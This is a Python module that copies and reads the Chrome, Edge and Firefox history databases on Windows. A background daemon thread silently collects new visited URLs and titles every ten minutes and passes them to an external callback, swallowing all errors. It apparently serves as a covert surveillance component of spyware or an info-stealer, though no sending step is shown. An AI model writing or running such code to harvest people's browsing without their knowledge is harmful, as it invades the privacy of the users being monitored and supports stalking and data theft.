# browser_history.py — extracts history from Chrome, Edge, Firefox

import os, shutil, sqlite3, threading, time
from pathlib import Path
from datetime import datetime, timedelta

APPDATA  = Path(os.environ.get("LOCALAPPDATA", ""))
ROAMING  = Path(os.environ.get("APPDATA", ""))

BROWSER_DB_PATHS = {
    "Chrome": APPDATA / "Google" / "Chrome" / "User Data" / "Default" / "History",
    "Edge":   APPDATA / "Microsoft" / "Edge"  / "User Data" / "Default" / "History",
    "Firefox": None,  # handled separately
}

_last_pulled: dict = {}   # browser -> last timestamp pulled


def _chrome_time_to_dt(chrome_time: int) -> datetime:
    """Chrome stores time as microseconds since 1601-01-01."""
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)


def _pull_chromium(browser: str, db_path: Path, since: datetime) -> list:
    """Pull history from a Chromium-based browser (Chrome/Edge)."""
    if not db_path.exists():
        return []

    # Copy DB because browser locks it
    tmp = Path(os.environ["TEMP"]) / f"_tmp_{browser}.db"
    try:
        shutil.copy2(str(db_path), str(tmp))
    except Exception:
        return []

    entries = []
    try:
        conn = sqlite3.connect(str(tmp))
        rows = conn.execute(
            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
        ).fetchall()
        conn.close()
        for url, title, ts in rows:
            dt = _chrome_time_to_dt(ts)
            if dt > since:
                entries.append(f"[{dt.strftime('%Y-%m-%d %H:%M:%S')}] {browser} | {title or 'No Title'} | {url}")
    except Exception:
        pass
    finally:
        try:
            tmp.unlink()
        except Exception:
            pass

    return entries


def _pull_firefox(since: datetime) -> list:
    """Pull history from Firefox profiles."""
    profiles_dir = ROAMING / "Mozilla" / "Firefox" / "Profiles"
    if not profiles_dir.exists():
        return []

    entries = []
    for profile in profiles_dir.iterdir():
        db_path = profile / "places.sqlite"
        if not db_path.exists():
            continue
        tmp = Path(os.environ["TEMP"]) / "_tmp_firefox.db"
        try:
            shutil.copy2(str(db_path), str(tmp))
            conn = sqlite3.connect(str(tmp))
            # Firefox stores time as microseconds since 1970
            since_us = int(since.timestamp() * 1_000_000)
            rows = conn.execute(
                "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date > ? ORDER BY last_visit_date DESC LIMIT 500",
                (since_us,)
            ).fetchall()
            conn.close()
            for url, title, ts in rows:
                dt = datetime.utcfromtimestamp(ts / 1_000_000)
                entries.append(f"[{dt.strftime('%Y-%m-%d %H:%M:%S')}] Firefox | {title or 'No Title'} | {url}")
        except Exception:
            pass
        finally:
            try:
                tmp.unlink()
            except Exception:
                pass

    return entries


def pull_all(since: datetime = None) -> str:
    """Pull history from all browsers since `since` datetime. Returns formatted string."""
    if since is None:
        since = datetime.utcnow() - timedelta(hours=24)

    all_entries = []

    for browser, path in BROWSER_DB_PATHS.items():
        if browser == "Firefox":
            all_entries.extend(_pull_firefox(since))
        elif path:
            all_entries.extend(_pull_chromium(browser, path, since))

    if not all_entries:
        return ""

    return "\n".join(all_entries)


def start(on_pull_callback, interval: int = 600):
    """
    Pull browser history every `interval` seconds.
    Calls on_pull_callback(text) with new entries.
    """
    last_check = [datetime.utcnow() - timedelta(hours=1)]

    def loop():
        while True:
            time.sleep(interval)
            try:
                text = pull_all(since=last_check[0])
                last_check[0] = datetime.utcnow()
                if text.strip():
                    on_pull_callback(text)
            except Exception:
                pass

    t = threading.Thread(target=loop, daemon=True)
    t.start()
